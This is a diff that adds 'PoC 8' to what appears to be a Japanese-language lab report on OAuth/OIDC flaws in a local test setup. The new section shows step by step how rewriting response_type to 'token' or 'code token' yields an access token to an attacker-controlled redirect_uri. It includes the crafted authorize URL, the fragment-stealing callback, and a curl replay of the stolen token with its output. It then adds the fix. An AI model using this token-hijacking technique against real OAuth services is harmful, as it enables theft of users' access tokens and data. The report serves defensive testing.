@@ -373,6 +373,55 @@ HTTP/1.1 204 No Content
 
 ---
 
+### 【PoC 8】 response_type の切り替えによる Implicit Grant の悪用 (Deprecated Flow Switching)
+
+#### 概要
+
+`gallery` の認可エンドポイントは `response_type` パラメータの値によってクライアントごとに許可されたフローを制限していません。
+`photoprint` はサーバーサイドの Web アプリケーションであり、本来 `response_type=code`（認可コードフロー）のみを使うべきクライアントですが、認可リクエストの `response_type` を `token`（Implicit Grant）または `code token`（ハイブリッドフロー）に書き換えるだけで、クライアント認証（`client_secret`）を一切経由せずにアクセストークンを直接取得できてしまいます。
+
+`response_types_supported: ["code", "token", "code token"]` という `.well-known` のメタデータ自体は以前から存在していましたが、実際にこれらのフローが動くかどうかは別問題です。本 PoC はその整合性、および `response_type` を書き換えるだけで非推奨フローに切り替えられてしまう脆弱性を確認したものです（`OAuth_OIDC_Vulnerability_Summary.md` の「非推奨フローの排除: ブラウザやネイティブアプリで `response_type=token` (Implicit Grant) を使用していないか」に対応する検証項目）。
+
+#### 実証手順 ＆ エビデンス
+
+`attacker` のトップページに追加された「Switch to Implicit Grant」リンクを経由し、`koen` としてログイン済みのブラウザで以下の認可 URL を踏む。
+
+```
+http://gallery.127.0.0.1.nip.io:3005/oauth/authorize?response_type=token&redirect_uri=http%3A%2F%2Fattacker.127.0.0.1.nip.io%3A1337%2Fcallback&scope=view_gallery&client_id=photoprint
+```
+
+通常の認可コードフローと同じ同意ダイアログ（`Authorize PhotoPrint`）が表示され、`Allow` を押すと以下のURLへリダイレクトされる。
+
+```
+Location: http://attacker.127.0.0.1.nip.io:1337/callback#access_token=93213&token_type=Bearer
+```
+
+`code` パラメータは一切含まれず、アクセストークンが **URL フラグメント** に直接載って返ってきている。フラグメントはブラウザからサーバーへ送信されないため、`attacker/callback` は本来サーバー側では読み取れないが、ページに仕込んだ数行のクライアントサイド JavaScript（`window.location.hash` を読むだけ）で簡単に横取りできる。
+
+```html
+<div id="implicit-token">I also stole the following access token straight out of your browser's URL fragment (Implicit Grant): 93213</div>
+```
+
+奪取したトークンはリソースサーバーでそのまま有効である。
+
+```bash
+curl -s -H "Accept: application/json" "http://gallery.127.0.0.1.nip.io:3005/photos/koen?access_token=93213"
+```
+
+```json
+{"images":[{"_id":"c861dc9ba8c5f937afccfccb","description":"Kuleuven Bib"},{"_id":"530446a110f64578078d9ce3","description":"Arenberg Castle"}]}
+```
+
+`response_type=code%20token`（ハイブリッド）を指定した場合は、`code` と `access_token` の両方が同じフラグメントに載って返る。
+
+```
+Location: http://photoprint:3000/callback#access_token=27475&code=70653&state=xyz2&token_type=Bearer
+```
+
+いずれの場合も、`client_id=photoprint` は本来サーバーサイドアプリ用に登録されたクライアントであり、`client_secret` は一度も送信されていない。`response_type` クエリパラメータを書き換えるだけで、バックチャネルでのクライアント認証を完全に迂回してアクセストークンを取得できることが確認できる。
+
+---
+
 ## 3. 対策まとめ
 
 ### 【PoC 1】 CSRF (クロスサイトリクエストフォージェリ)
@@ -402,3 +451,7 @@ PoC 4 と同様に、トークンエンドポイントでリフレッシュト�
 ### 【PoC 7】 リソースサーバにおける scope 未検証 (Resource Server: Scope Not Validated)
 
 実装済みの `ensureScope()` を書き込み系 API（`PUT`/`DELETE` 等）を含む全ルートに適用し、トークンが持つスコープを超える操作を拒否する。
+
+### 【PoC 8】 response_type の切り替えによる Implicit Grant の悪用 (Deprecated Flow Switching)
+
+認可エンドポイントで、リクエストされた `response_type` がクライアントに事前登録されたフロー（例: `photoprint` なら `code` のみ）と一致するかを検証し、許可されていない `response_type` を含むリクエストは拒否する。根本的には Implicit Grant およびハイブリッドフロー自体を提供せず、`response_types_supported` からも `token` / `code token` を削除して認可コードフロー（PKCE 併用）のみに一本化する。
